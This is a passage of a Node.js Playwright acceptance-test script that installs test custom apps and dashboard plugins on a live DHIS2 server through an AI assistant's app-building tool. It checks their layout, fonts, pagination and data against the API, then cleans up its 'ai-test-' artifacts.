#!/usr/bin/env node
'use strict';
/* ─────────────────────────────────────────────────────────────────────────────
 * scenario-custom-apps-visual.js — live + visual acceptance for manage_custom_app.
 *
 * Builds real apps/plugins with the REAL tool (executeTool via live-harness),
 * installs them on a live DHIS2, opens them the way a user would in Chrome
 * (Playwright) and checks them functionally and visually:
 *   console errors / uncaught exceptions / failed requests from the app frame,
 *   Roboto font, no double header bar in the Global Shell, no horizontal
 *   overflow or clipped text at 1440 px and 400 px, plugins fitting their
 *   (fixed-size) dashboard item, loading → resolved, empty and error states,
 *   rendered numbers == the same numbers fetched from the API, dashboard
 *   ou/pe filters re-rendering without a reload, per-item settings in edit
 *   mode, Arabic/RTL under keyUiLocale=ar, update → rollback, and the negative
 *   paths (each must fail cleanly and leave the server unchanged).
 *
 * Writes test-results/custom-apps/report.html (+ screens/, results.json).
 *
 * Usage:
 *   node scripts/scenario-custom-apps-visual.js            # full run, cleans up
 *   node scripts/scenario-custom-apps-visual.js --keep     # leave everything for inspection
 *   node scripts/scenario-custom-apps-visual.js --only=1,2 # subset (setup scenarios still run)
 * Env: DHIS2_BASE / DHIS2_AUTH / DHIS2_APIVER (as live-harness.js);
 *      PLAYWRIGHT_CORE_PATH, CHROME_PATH (optional); LLM_BASE_URL / LLM_MODEL /
 *      LLM_API_KEY enable scenario 9 (end-to-end through the agent loop).
 *
 * Every test artifact is prefixed "ai-test-" (apps, dashboards, dataStore
 * namespaces, app backups) and is removed at the end unless --keep. Nothing
 * else on the instance is modified; the test user's UI locale is restored.
 * ───────────────────────────────────────────────────────────────────────────── */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { load, API, summarize, setAuth, BASE, APIVER } = require('./live-harness');

const ROOT = path.resolve(__dirname, '..');
const SRC = path.join(__dirname, 'custom-app-scenarios');
const OUT = path.join(ROOT, 'test-results', 'custom-apps');
const SHOTS = path.join(OUT, 'screens');
const STATE_FILE = path.join(OUT, 'session.json');
const ARGS = process.argv.slice(2);
const KEEP = ARGS.includes('--keep');
const ONLY = ((ARGS.find((a) => a.startsWith('--only=')) || '').slice(7)).split(',').filter(Boolean);
const USERPASS = process.env.DHIS2_AUTH || 'admin:district';
const USER = USERPASS.split(':')[0];
const PASS = USERPASS.split(':').slice(1).join(':');
const AUTHH = 'Basic ' + Buffer.from(USERPASS).toString('base64');
const DESKTOP = { width: 1440, height: 900 };
const NARROW = { width: 400, height: 860 };
const BACKUP_NS = 'dhis2-ai-extension-backups';

// Visual problems found while LOOKING at the screenshots during development,
// and the root-cause fix made for each (shown in the report).
const VISUAL_FIXES = [
  'Prototype text rendered in a serif font: the kit now ships d2-kit.css with Roboto 400/500/700 (latin + latin-ext) and an Arabic-capable system-font fallback.',
  'Dashboard items have a FIXED size (Dashboard 101.6.1 passes setPluginHeight = null), so plugin pages get body.d2-plugin + a full-height #root and the manual teaches fill-the-item layouts instead of resizing.',
  'Tables with fixed pixel column widths overflowed a 400 px screen: scenario apps (and the manual) use % widths, hide secondary columns when narrow and clamp() page padding.',
  'Chart month labels ("September 2026") overlapped in narrow items: short labels ("Sep 26") + hideOverlap.',
  'DHIS2 app-development skill conventions adopted: Pagination inside DataTableFoot, empty table = one colSpan row, alerts via useAlert, a confirmation Modal before delete.',
  'KPI tiles showed a small left-aligned label + number in tall, mostly empty boxes: redesigned as DHIS2 single-value tiles (centred, number scales with the item: clamp(24px, 10vmin, 44px)); the manual now teaches this.',
  'Empty-state copy read "no data for Palestine in This year": now "for Palestine (This year)".',
  'The settings widget number now uses the same scaled single-value style as the KPI tiles.',
];

// ── Playwright (reuse an existing install; never `playwright install`) ──────
function cmpVer(a, b) {
  const pa = String(a).split(/[.-]/).map((x) => parseInt(x, 10) || 0);
  const pb = String(b).split(/[.-]/).map((x) => parseInt(x, 10) || 0);
  for (let i = 0; i < Math.max(pa.length, pb.length); i++) if ((pa[i] || 0) !== (pb[i] || 0)) return (pa[i] || 0) - (pb[i] || 0);
  return 0;
}
function loadPlaywright() {
  const tries = [process.env.PLAYWRIGHT_CORE_PATH, 'playwright', 'playwright-core'].filter(Boolean);
  for (const t of tries) { try { return { pw: require(t), from: t }; } catch { /* next */ } }
  const npx = path.join(os.homedir(), '.npm', '_npx');
  const found = [];
  if (fs.existsSync(npx)) {
    for (const d of fs.readdirSync(npx)) {
      const p = path.join(npx, d, 'node_modules', 'playwright-core');
      if (fs.existsSync(path.join(p, 'package.json'))) found.push({ p, v: require(path.join(p, 'package.json')).version });
    }
  }
  found.sort((a, b) => cmpVer(b.v, a.v));
  for (const f of found.filter((x) => !/alpha|beta/.test(x.v)).concat(found)) {
    try { return { pw: require(f.p), from: `${f.p} (${f.v})` }; } catch { /* next */ }
  }
  throw new Error('Playwright not found — install playwright-core or set PLAYWRIGHT_CORE_PATH.');
}
function launchOptions(pw) {
  if (process.env.CHROME_PATH) return { executablePath: process.env.CHROME_PATH };
  try { const p = pw.chromium.executablePath(); if (p && fs.existsSync(p)) return {}; } catch { /* no bundled browser */ }
  for (const p of ['/usr/bin/google-chrome', '/usr/bin/chromium', '/usr/bin/chromium-browser', '/snap/bin/chromium']) {
    if (fs.existsSync(p)) return { executablePath: p };
  }
  return { channel: 'chrome' };
}

// ── Results ─────────────────────────────────────────────────────────────────
const R = { started: new Date().toISOString(), facts: {}, scenarios: [], notes: [], fixes: VISUAL_FIXES, toolApi: {} };
let cur = null;
function scenario(id, title) {
  cur = { id: String(id), title, checks: [], shots: [], logs: [], skipped: null };
  R.scenarios.push(cur);
  console.log(`\n── ${id}. ${title}`);
  return cur;
}
function want(id) { return !ONLY.length || ONLY.includes(String(id)); }
function check(name, pass, detail) {
  cur.checks.push({ name, pass: !!pass, detail: detail == null ? '' : String(detail).slice(0, 600) });
  console.log(`  ${pass ? '\x1b[32m✓\x1b[0m' : '\x1b[31m✗\x1b[0m'} ${name}${detail != null && detail !== '' ? ` — ${String(detail).slice(0, 220)}` : ''}`);
  return !!pass;
}
function note(text) { cur.logs.push(text); }
let shotN = 0;
async function shot(target, label, opts = {}) {
  shotN++;
  const file = `${String(shotN).padStart(3, '0')}-${cur.id}-${label.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')}.png`;
  try {
    await target.screenshot({ path: path.join(SHOTS, file), fullPage: !!opts.fullPage });
    cur.shots.push({ label, file: `screens/${file}`, group: opts.group || label });
  } catch (e) { note(`screenshot "${label}" failed: ${e.message}`); }
}

// ── Test-side API (setup / verification only — not counted as tool calls) ───
async function api(method, p, body, extraHeaders) {
  const r = await fetch(`${BASE}/api/${APIVER}/${p}`, {
    method,
    headers: { Authorization: AUTHH, Accept: 'application/json', ...(body != null ? { 'Content-Type': 'application/json' } : {}), ...(extraHeaders || {}) },
    body: body != null ? (typeof body === 'string' ? body : JSON.stringify(body)) : undefined,
  });
  const text = await r.text();
  let json = null;
  try { json = text ? JSON.parse(text) : null; } catch { /* text */ }
  return { status: r.status, ok: r.ok, json, text };
}
const qs = (params) => new URLSearchParams(params).toString(); // encodes [ ] for strict Tomcat
async function analyticsValues(dx, ou, pe) {
  const r = await api('GET', `analytics?${qs([['dimension', `dx:${dx}`], ['filter', `ou:${ou}`], ['filter', `pe:${pe}`]])}`);
  const out = {};
  if (!r.ok) return out;
  const h = r.json.headers.map((x) => x.name);
  for (const row of r.json.rows) out[row[h.indexOf('dx')]] = Number(row[h.indexOf('value')]);
  return out;
}
async function eventCount(program, ou, pe) {
  const r = await api('GET', `analytics/events/aggregate/${program}?${qs([['filter', `ou:${ou}`], ['filter', `pe:${pe}`], ['outputType', 'EVENT']])}`);
  return r.ok && r.json.rows.length ? Number(r.json.rows[0][r.json.rows[0].length - 1]) : null;
}
async function appsSnapshot() {
  const r = await api('GET', 'apps');
  return (r.json || []).map((a) => `${a.key}@${a.version}`).sort().join(',');
}
async function namespacesSnapshot() {
  const r = await api('GET', 'dataStore');
  return (r.json || []).filter((n) => n.startsWith('ai-')).sort().join(',');
}
const read = (f) => fs.readFileSync(path.join(SRC, f), 'utf8');

// ── The real tool ───────────────────────────────────────────────────────────
let ctx = null;
async function tool(args) {
  const mark = API.length;
  const r = await ctx.executeTool('manage_custom_app', args);
  const { failed } = summarize(mark);
  return { r, failed, calls: API.length - mark };
}
// preview → (user approval) → create with the preview token: the manual's workflow.
// The approval is the user's NEXT message, so the turn advances in between —
// the tool refuses to install a preview made in the same turn.
async function previewAndCreate(args) {
  const pv = await tool({ ...args, action: 'preview' });
  if (pv.r._error) return { pv, cr: pv };
  const d = ctx.__getDhis2();
  d.turnCounter = (d.turnCounter || 0) + 1;
  const cr = await tool({ action: 'create', key: pv.r.key, name: args.name, preview_token: pv.r.preview_token });
  return { pv, cr };
}

// ── Browser helpers ─────────────────────────────────────────────────────────
// Runs in every frame before any page script: records uncaught errors so they
// can be read back from the app frame itself.
const ERROR_CAPTURE = () => {
  window.__aiErrs = [];
  window.addEventListener('error', (e) => { if (e && e.message) window.__aiErrs.push(`error: ${e.message}`); });
  window.addEventListener('unhandledrejection', (e) => window.__aiErrs.push(`unhandledrejection: ${(e.reason && e.reason.message) || e.reason}`));
};
async function newContext(browser, viewport) {
  const c = await browser.newContext({ viewport, storageState: fs.existsSync(STATE_FILE) ? STATE_FILE : undefined, locale: 'en-US' });
  await c.addInitScript(ERROR_CAPTURE);
  return c;
}
async function login(browser) {
  const c = await browser.newContext();
  const r = await c.request.post(`${BASE}/api/auth/login`, { data: { username: USER, password: PASS } });
  if (!r.ok()) {
    // < v41: classic form login
    const page = await c.newPage();
    await page.goto(`${BASE}/dhis-web-commons/security/login.action`);
    await page.fill('#j_username', USER);
    await page.fill('#j_password', PASS);
    await page.click('#submit');
    await page.waitForLoadState('networkidle');
  }
  await c.storageState({ path: STATE_FILE });
  await c.close();
}
// Attach console / network collectors attributing problems to ONE app.
function collect(page, appKey, allow = []) {
  const log = { console: [], failed: [], expected: [], appUrls: new Set() };
  const appPath = `/api/apps/${appKey}/`;
  const fromApp = (req) => { try { return req.frame().url().includes(appPath); } catch { return false; } };
  const allowed = (s) => allow.some((a) => String(s).includes(a));
  page.on('request', (req) => { if (fromApp(req)) log.appUrls.add(req.url()); });
  page.on('response', (res) => {
    const req = res.request();
    if (res.status() < 400) return;
    if (!(fromApp(req) || res.url().includes(appPath))) return;
    (allowed(res.url()) ? log.expected : log.failed).push(`${res.status()} ${req.method()} ${res.url().replace(BASE, '')}`);
  });
  page.on('requestfailed', (req) => {
    const err = (req.failure() && req.failure().errorText) || '';
    if (fromApp(req) && !/ERR_ABORTED/.test(err)) log.failed.push(`FAILED ${req.method()} ${req.url().replace(BASE, '')} ${err}`);
  });
  page.on('console', (msg) => {
    if (msg.type() !== 'error') return;
    const loc = (msg.location() && msg.location().url) || '';
    if (!(loc.includes(appPath) || log.appUrls.has(loc))) return;
    (allowed(`${loc} ${msg.text()}`) ? log.expected : log.console).push(msg.text().slice(0, 300));
  });
  page.on('pageerror', (err) => { if (String(err.stack || '').includes(appPath)) log.console.push(`uncaught: ${err.message}`); });
  return log;
}
async function appFrame(page, appKey, file, timeout = 30000) {
  const t0 = Date.now();
  while (Date.now() - t0 < timeout) {
    const f = page.frames().find((fr) => fr.url().includes(`/api/apps/${appKey}/${file}`));
    if (f) return f;
    await page.waitForTimeout(200);
  }
  throw new Error(`no ${file} frame for ${appKey}`);
}
function appFrames(page, appKey, file) {
  return page.frames().filter((fr) => fr.url().includes(`/api/apps/${appKey}/${file}`));
}
// Settled = something rendered and no loader left.
async function settled(frame, timeout = 30000) {
  await frame.waitForFunction(() => {
    const r = document.getElementById('root');
    return r && r.children.length > 0 && !document.querySelector('[role="progressbar"]');
  }, null, { timeout });
  await frame.waitForTimeout(400);
}
// Layout / typography metrics of an app or plugin frame. A DHIS2 header bar
// (the Global Shell's or @dhis2/ui HeaderBar) is detected by its logo block.
async function metrics(frame) {
  // Fonts load asynchronously; measuring before they finish made the Roboto
  // check flaky (passed for hundreds of runs, then one cold-cache miss).
  await frame.evaluate(() => document.fonts.ready).catch(() => {});
  return frame.evaluate(() => {
    const se = document.scrollingElement || document.documentElement;
    const root = document.getElementById('root');
    const all = [...root.querySelectorAll('*')];
    const textEl = all.find((e) => [...e.childNodes].some((n) => n.nodeType === 3 && n.textContent.trim())) || document.body;
    const ff = getComputedStyle(textEl).fontFamily;
    const clipped = [];
    const offscreen = [];
    let leafBottom = 0;
    for (const el of all) {
      const cs = getComputedStyle(el);
      const r = el.getBoundingClientRect();
      if (cs.display === 'none' || cs.visibility === 'hidden' || r.width === 0 || r.height === 0) continue;
      if (el.closest('[data-test="dhis2-uicore-layer"], [data-test="dhis2-uicore-popper"]')) continue; // menus / popovers
      if (el.scrollWidth > el.clientWidth + 2 && ['hidden', 'clip'].includes(cs.overflowX) && cs.textOverflow !== 'ellipsis' && el.clientWidth > 0 && el.tagName !== 'CANVAS') {
        clipped.push(`${el.tagName.toLowerCase()}${el.className && typeof el.className === 'string' ? '.' + el.className.split(' ')[0] : ''} (${el.scrollWidth}>${el.clientWidth})`);
      }
      if (r.right > innerWidth + 1 || r.left < -1) offscreen.push(`${el.tagName.toLowerCase()} [${Math.round(r.left)},${Math.round(r.right)}]`);
      // Where the CONTENT ends: leaves (text, values, canvas, inputs), not the
      // full-height wrappers that always span the item.
      if (!el.firstElementChild || /^(CANVAS|SVG|IMG|INPUT|TEXTAREA|BUTTON)$/i.test(el.tagName)) leafBottom = Math.max(leafBottom, r.bottom + se.scrollTop);
    }
    return {
      width: innerWidth,
      height: innerHeight,
      fontFamily: ff,
      robotoLoaded: [...document.fonts].some((f) => /roboto/i.test(f.family) && f.status === 'loaded'),
      hScroll: se.scrollWidth > se.clientWidth + 1,
      rootHScroll: root.scrollWidth > root.clientWidth + 1,
      vScroll: se.scrollHeight > se.clientHeight + 2,
      scrollHeight: se.scrollHeight,
      clipped: clipped.slice(0, 5),
      offscreen: offscreen.slice(0, 5),
      contentBottom: Math.round(leafBottom),
      headerBars: document.querySelectorAll('[data-test="headerbar-logo"]').length,
      loaders: document.querySelectorAll('[role="progressbar"]').length,
      notices: [...document.querySelectorAll('[data-test="dhis2-uicore-noticebox"]')].map((n) => ({ text: n.innerText.replace(/\s+/g, ' ').slice(0, 160), error: /\berror\b/.test(n.className) })),
      dir: getComputedStyle(root.firstElementChild || root).direction,
      errs: (window.__aiErrs || []).slice(),
    };
  });
}
// The shared visual / quality assertions for one rendered state.
function assertLayout(m, label, { plugin = false } = {}) {
  check(`${label}: body text uses Roboto`, /^\s*"?Roboto/i.test(m.fontFamily) && m.robotoLoaded, m.fontFamily);
  check(`${label}: no header bar inside the app`, m.headerBars === 0, m.headerBars);
  check(`${label}: no horizontal scroll (page / root)`, !m.hScroll && !m.rootHScroll && m.offscreen.length === 0, m.offscreen.join('; ') || `${m.width}px`);
  check(`${label}: no clipped text`, m.clipped.length === 0, m.clipped.join('; '));
  if (plugin) {
    check(`${label}: content fits the item (no inner scrollbar)`, !m.vScroll, `scrollHeight ${m.scrollHeight} / item ${m.height}`);
    if (!m.notices.length) check(`${label}: fills the item (no large empty gap)`, m.contentBottom >= m.height * 0.5, `content ends at ${m.contentBottom}px of ${m.height}px`);
  }
  check(`${label}: no uncaught exceptions in the frame`, m.errs.length === 0, m.errs.join('; '));
}
function assertLogs(log, label) {
  check(`${label}: zero console errors from the app`, log.console.length === 0, log.console.join(' | '));
  check(`${label}: zero failed requests from the app`, log.failed.length === 0, log.failed.join(' | '));
  if (log.expected.length) note(`${label}: expected failures (not counted): ${log.expected.join(' | ')}`);
  cur.logs.push(...log.console.map((c) => `console: ${c}`), ...log.failed.map((f) => `request: ${f}`));
}
// Delay matching requests so the loading state is observable.
async function withSlowRequests(context, pathEnd, ms) {
  await context.route((url) => url.pathname.endsWith(pathEnd), async (route) => { await new Promise((r) => setTimeout(r, ms)); await route.continue(); });
}
async function sawLoader(frame, timeout = 8000) {
  try {
    await frame.waitForSelector('[role="progressbar"]', { timeout });
    return true;
  } catch { return false; }
}
function dashFrame(page) {
  return page.frames().find((f) => f.url().includes('dhis-web-dashboard/index.html')) || page.mainFrame();
}
async function openDashboard(page, id, suffix = '') {
  // A hash-only change does not reload the shell, and the plugin frames of the
  // previous view would detach mid-check — always start from a clean load.
  await page.goto('about:blank');
  await page.goto(`${BASE}/apps/dashboard#/${id}${suffix}`, { waitUntil: 'domcontentloaded' });
  for (let i = 0; i < 100 && !page.frames().some((f) => f.url().includes('dhis-web-dashboard/index.html')); i++) await page.waitForTimeout(200);
  const dash = dashFrame(page);
  await dash.waitForLoadState('domcontentloaded');
  return dash;
}
async function reloadDashboard(page) {
  const old = dashFrame(page);
  await page.reload({ waitUntil: 'domcontentloaded' });
  for (let i = 0; i < 100; i++) {
    const f = page.frames().find((fr) => fr.url().includes('dhis-web-dashboard/index.html'));
    if (f && f !== old) { await f.getByRole('button', { name: /Filter/ }).waitFor({ timeout: 30000 }); return f; }
    await page.waitForTimeout(200);
  }
  throw new Error('dashboard did not reload');
}
async function applyPeriodFilter(dash, label) {
  await dash.getByRole('button', { name: /Filter/ }).click();
  await dash.getByText('Period', { exact: true }).click();
  await dash.getByText(label, { exact: true }).dblclick();
  await dash.getByRole('button', { name: 'Confirm' }).click();
}
async function applyOuFilter(dash, ouName) {
  await dash.getByRole('button', { name: /Filter/ }).click();
  await dash.getByText('Organisation unit', { exact: true }).click();
  const dlg = dash.locator('[role=dialog]').first();
  await dlg.getByText(ouName, { exact: true }).click();
  await dash.getByRole('button', { name: 'Confirm' }).click();
}
const num = (s) => {
  if (s == null) return null;
  const t = String(s).replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d)).replace(/[,%\s٬]/g, '');
  const n = parseFloat(t);
  return Number.isNaN(n) ? null : n;
};
const round1 = (n) => Math.round(n * 10) / 10;

// ── Cleanup ─────────────────────────────────────────────────────────────────
// Apps the real-LLM scenario installed under keys of the model's choosing.
const llmCreatedKeys = [];
// Backups that existed before this run (never deleted).
let backupsBefore = new Set();
async function cleanup(reason) {
  const out = { apps: [], dashboards: [], namespaces: [], backups: [], placements: [] };
  if (reason === 'before') {
    const nss0 = (await api('GET', 'dataStore')).json || [];
    const keys0 = nss0.includes(BACKUP_NS) ? ((await api('GET', `dataStore/${BACKUP_NS}`)).json || []) : [];
    backupsBefore = new Set(keys0);
  }
  // Placements a crashed run left in Capture's config (the app may be gone).
  if (ctx) {
    const capKeys = ((await api('GET', 'dataStore')).json || []).includes('capture') ? ((await api('GET', 'dataStore/capture')).json || []) : [];
    const stale = new Set();
    for (const k of capKeys.filter((x) => ['enrollmentOverviewLayout', 'enrollmentEventNewLayout', 'enrollmentEventEditLayout', 'dataEntryForms'].includes(x))) {
      const txt = JSON.stringify((await api('GET', `dataStore/capture/${k}`)).json || {});
      for (const m of txt.matchAll(/\/api\/apps\/(ai-test-[a-z0-9-]+)\//g)) stale.add(m[1]);
    }
    for (const k of [...stale, ...llmCreatedKeys]) {
      const r = await ctx.executeTool('manage_custom_app', { action: 'unplace', key: k, skip_backup: true });
      if (r && r.removed && r.removed.length) out.placements.push(`${k}: ${r.removed.length}`);
    }
  }
  const apps = (await api('GET', 'apps')).json || [];
  for (const a of apps.filter((x) => String(x.key).startsWith('ai-test-') || llmCreatedKeys.includes(x.key))) {
    if (a.developer && a.developer.company === 'dhis2-ai-assistant' && ctx) {
      await ctx.executeTool('manage_custom_app', { action: 'delete', key: a.key, skip_backup: true, delete_app_data: true });
    } else {
      await api('DELETE', `apps/${a.key}?deleteAppData=true`);
    }
    out.apps.push(a.key);
  }
  const dashes = (await api('GET', `dashboards?${qs({ filter: 'name:like:ai-test-', fields: 'id,name', paging: 'false' })}`)).json;
  for (const d of (dashes && dashes.dashboards) || []) { await api('DELETE', `dashboards/${d.id}`); out.dashboards.push(d.name); }
  const nss = (await api('GET', 'dataStore')).json || [];
  for (const ns of nss.filter((n) => n.startsWith('ai-test-'))) { await api('DELETE', `dataStore/${encodeURIComponent(ns)}`); out.namespaces.push(ns); }
  if (nss.includes(BACKUP_NS)) {
    const keys = (await api('GET', `dataStore/${BACKUP_NS}`)).json || [];
    // App backups of test apps, and the backups this run's placements made
    // (Capture config, ai-test- dashboards) — recognised by their reason, so a
    // backup someone else makes meanwhile on the same server is never touched.
    for (const k of keys) {
      let mine = /-app-ai-test-/.test(k);
      if (!mine && !backupsBefore.has(k)) {
        const e = (await api('GET', `dataStore/${BACKUP_NS}/${encodeURIComponent(k)}`)).json || {};
        mine = /\bai-test-/.test(String(e.reason || '')) || llmCreatedKeys.some((x) => String(e.reason || '').includes(x));
      }
      if (mine) { await api('DELETE', `dataStore/${BACKUP_NS}/${encodeURIComponent(k)}`); out.backups.push(k); }
    }
  }
  console.log(`[cleanup:${reason}] apps ${out.apps.length}, dashboards ${out.dashboards.length}, namespaces ${out.namespaces.length}, backups ${out.backups.length}, placements ${out.placements.length}`);
  return out;
}

// ── Main ────────────────────────────────────────────────────────────────────
async function main() {
  fs.mkdirSync(SHOTS, { recursive: true });
  for (const f of fs.readdirSync(SHOTS)) fs.unlinkSync(path.join(SHOTS, f));

  // Instance facts.
  const info = await api('GET', 'system/info');
  if (!info.ok) throw new Error(`DHIS2 not reachable at ${BASE} (HTTP ${info.status}). Set DHIS2_BASE / DHIS2_AUTH.`);
  const appsNow = (await api('GET', 'apps')).json || [];
  const ver = (k) => (appsNow.find((a) => a.key === k) || {}).version || 'not installed';
  const originalLocale = (await api('GET', 'userSettings/keyUiLocale', null, { Accept: 'text/plain' })).text.replace(/"/g, '').trim() || 'en';
  R.facts = {
    base: BASE, version: info.json.version, revision: info.json.revision, apiVersion: APIVER,
    dashboardApp: ver('dashboard'), captureApp: ver('capture'), globalShell: ver('global-shell'),
    user: USER, originalLocale,
  };
  const minor = Number(String(info.json.version).split('.')[1]);
  const [dMaj, dMin] = String(R.facts.dashboardApp).split('.').map(Number);
  R.facts.pluginsSupported = minor > 40 || (minor === 40 && Number(String(info.json.version).split('.')[2]) >= 5);
  R.facts.dashboardPluginSupport = dMaj > 101 || (dMaj === 101 && dMin >= 0);
  const { pw, from } = loadPlaywright();
  R.facts.playwright = from;
  console.log(`DHIS2 ${R.facts.version} at ${BASE} · Dashboard ${R.facts.dashboardApp} · Capture ${R.facts.captureApp} · Playwright ${from}`);

  ctx = load({ appType: 'Dashboard' });
  // The suite stands in for a user who asked for the test apps to be
  // installed (the tool installs only on such a request or an earlier preview).
  require('vm').runInContext('lastUserText = "Install the test apps.";', ctx);
  await cleanup('before');

  const browser = await pw.chromium.launch({ headless: true, ...launchOptions(pw) });
  R.facts.browser = browser.version();
  await login(browser);

  const dashboards = {};
  try {
    // ── 1. Standalone metadata browser ────────────────────────────────────
    if (want(1)) {
      scenario(1, 'Standalone metadata browser (kind: app) — searchable, paginated programs table');
      const { pv, cr } = await previewAndCreate({ name: 'AI test program browser', key: 'ai-test-browser', kind: 'app', description: 'Programs with stage and data-element counts', files: { 'app.jsx': read('metadata-browser.app.jsx') } });
      check('preview: compiles, scans and lints clean', pv.r.preview === true && !pv.r._error, pv.r._error || `${pv.r.zip_bytes} bytes, warnings ${(pv.r.warnings || []).length}`);
      check('create: installed and verified', cr.r.success === true, cr.r._error || `${cr.r.key} v${cr.r.version}`);
      check('tool made zero failed API calls', pv.failed.length + cr.failed.length === 0, [...pv.failed, ...cr.failed].map((f) => `${f.status} ${f.url}`).join(' | '));
      const expectPage = async (page, q) => {
        const r = await api('GET', `programs?${qs({ fields: 'id,displayName,programType,programStages[id,programStageDataElements~size]', order: 'displayName:asc', page: String(page), pageSize: '10', ...(q ? { filter: `displayName:ilike:${q}` } : {}) })}`);
        return r.json.programs.map((p) => ({ name: p.displayName, stages: p.programStages.length, des: p.programStages.reduce((n, s) => n + (s.programStageDataElements || 0), 0) }));
      };
      const readRows = (frame) => frame.evaluate(() => [...document.querySelectorAll('tbody tr')].map((tr) => {
        const cells = [...tr.querySelectorAll('td')].map((td) => td.innerText.trim());
        return { name: cells[0].split('\n')[0], stages: cells[cells.length - 2], des: cells[cells.length - 1] };
      }));
      for (const [vp, label] of [[DESKTOP, 'desktop'], [NARROW, 'narrow']]) {
        const context = await newContext(browser, vp);
        await withSlowRequests(context, `/api/${APIVER}/programs`, 1200);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-browser');
        await page.goto(`${BASE}/api/apps/ai-test-browser/index.html?redirect=false`);
        const f = page.mainFrame();
        check(`${label}: loading state (CircularLoader) is shown while data loads`, await sawLoader(f));
        await settled(f);
        const m = await metrics(f);
        assertLayout(m, `direct ${label}`);
        await shot(page, `direct ${label}`, { fullPage: true, group: label });
        const want1 = await expectPage(1);
        const got1 = await readRows(f);
        check(`${label}: page 1 rows == API (names, stage and data-element counts)`, JSON.stringify(got1.map((r) => [r.name, num(r.stages), num(r.des)])) === JSON.stringify(want1.map((r) => [r.name, r.stages, r.des])), `${got1.length} rows`);
        if (label === 'desktop') {
          await f.locator('input').first().fill('WQ');
          await f.waitForFunction(() => [...document.querySelectorAll('tbody tr')].every((tr) => /wq/i.test(tr.innerText)), null, { timeout: 15000 }).catch(() => {});
          await settled(f);
          const gotQ = await readRows(f);
          const wantQ = await expectPage(1, 'WQ');
          check('search "WQ" is server-side and matches the API filter', JSON.stringify(gotQ.map((r) => r.name)) === JSON.stringify(wantQ.map((r) => r.name)), `${gotQ.length} rows`);
          await shot(page, 'search WQ', { group: label });
          await f.locator('input').first().fill('zzzz-no-such-program');
          await f.waitForFunction(() => /No program name contains/.test(document.body.innerText), null, { timeout: 15000 }).catch(() => {});
          check('empty search result renders a friendly empty row, not a blank table', /No program name contains/.test(await f.evaluate(() => document.body.innerText)));
          await shot(page, 'empty search', { group: label });
          await f.locator('input').first().fill('');
          await f.waitForFunction(() => document.querySelectorAll('tbody tr').length >= 10, null, { timeout: 15000 }).catch(() => {});
          await settled(f);
          const firstOnPage1 = (await readRows(f))[0].name;
          await f.locator('[data-test="dhis2-uiwidgets-pagination-page-next"]').click();
          await f.waitForFunction((n) => !document.querySelector('[role="progressbar"]') && document.querySelectorAll('tbody tr').length > 0 && document.querySelector('tbody tr td').innerText.split('\n')[0] !== n, firstOnPage1, { timeout: 15000 }).catch(() => {});
          await settled(f);
          const got2 = await readRows(f);
          const want2 = await expectPage(2);
          check('pagination: page 2 == API page 2', JSON.stringify(got2.map((r) => r.name)) === JSON.stringify(want2.map((r) => r.name)), `${got2.length} rows`);
          await shot(page, 'page 2', { group: label });
        }
        assertLogs(log, `direct ${label}`);
        await context.close();
        // Through the v42 Global Shell, as from the app menu.
        const c2 = await newContext(browser, vp);
        const p2 = await c2.newPage();
        const log2 = collect(p2, 'ai-test-browser');
        await p2.goto(`${BASE}/apps/ai-test-browser`);
        const f2 = await appFrame(p2, 'ai-test-browser', 'index.html');
        await settled(f2);
        const shellBars = await p2.mainFrame().evaluate(() => document.querySelectorAll('[data-test="headerbar-logo"]').length);
        check(`global shell ${label}: exactly one header bar (the shell's)`, shellBars === 1, shellBars);
        assertLayout(await metrics(f2), `global shell ${label}`);
        await shot(p2, `global shell ${label}`, { group: label });
        assertLogs(log2, `global shell ${label}`);
        await c2.close();
      }
    }

    // Dashboard item shape: learn it from the Dashboard UI once (scenario 2 needs the plugin).
    // ── 2. KPI dashboard plugin ───────────────────────────────────────────
    let itemTemplate = null;
    if (want(2) || want(3) || want(4) || want(7)) {
      scenario(2, 'KPI dashboard plugin (DASHBOARD) — 4 analytics tiles following the ou / pe filters');
      const { pv, cr } = await previewAndCreate({ name: 'AI test KPI tiles', key: 'ai-test-kpi', kind: 'plugin', plugin_type: 'DASHBOARD', datastore_namespace: false, description: 'Water-quality KPIs and Malaria events', files: { 'plugin.jsx': read('kpi.plugin.jsx') } });
      check('preview → create (preview_token) installs the plugin', cr.r.success === true && !!pv.r.preview_token, cr.r._error || `${cr.r.key} v${cr.r.version} · ${cr.r.plugin_launch_url}`);
      check('tool made zero failed API calls', pv.failed.length + cr.failed.length === 0);
      const uids = Object.keys(pv.r.verified_uids || {});
      check('preview verified the 4 hard-coded UIDs on the server', uids.length === 4, uids.join(','));

      // Learn the APP dashboard-item JSON through the Dashboard UI (never guessed).
      const probe = await api('POST', 'dashboards', { name: 'ai-test-ui-probe', dashboardItems: [] });
      const probeId = probe.json.response.uid;
      {
        const context = await newContext(browser, DESKTOP);
        const page = await context.newPage();
        const dash = await openDashboard(page, probeId, '/edit');
        const search = dash.getByPlaceholder(/Search for visualizations/);
        await search.click();
        await search.fill('AI test KPI');
        await dash.getByText('AI test KPI tiles', { exact: true }).first().click();
        await page.waitForTimeout(1500);
        await dash.locator('#dhis2-portal-root .backdrop').first().click({ position: { x: 5, y: 5 } }).catch(() => {});
        await shot(page, 'added through the dashboard UI (edit mode)', { group: 'ui' });
        await dash.getByRole('button', { name: 'Save changes' }).click();
        await page.waitForTimeout(2500);
        await context.close();
      }
      const learned = (await api('GET', `dashboards/${probeId}?${qs({ fields: 'dashboardItems[type,appKey,x,y,width,height]' })}`)).json.dashboardItems[0];
      itemTemplate = learned && learned.type === 'APP' ? { type: learned.type, width: learned.width, height: learned.height } : null;
      check('dashboard item JSON for app plugins learned from the Dashboard UI', !!itemTemplate && learned.appKey === 'ai-test-kpi', JSON.stringify(learned));
      R.facts.appItemShape = learned;

      // Test dashboard: KPI + trend side by side (trend added in scenario 3).
      const kpiItem = { ...itemTemplate, appKey: 'ai-test-kpi', x: 0, y: 0, width: 30, height: 20 };
      const d = await api('POST', 'dashboards', { name: 'ai-test-kpi-trend', dashboardItems: [kpiItem] });
      dashboards.kpi = d.json.response.uid;

      const readTiles = (frame) => frame.evaluate(() => {
        const out = {};
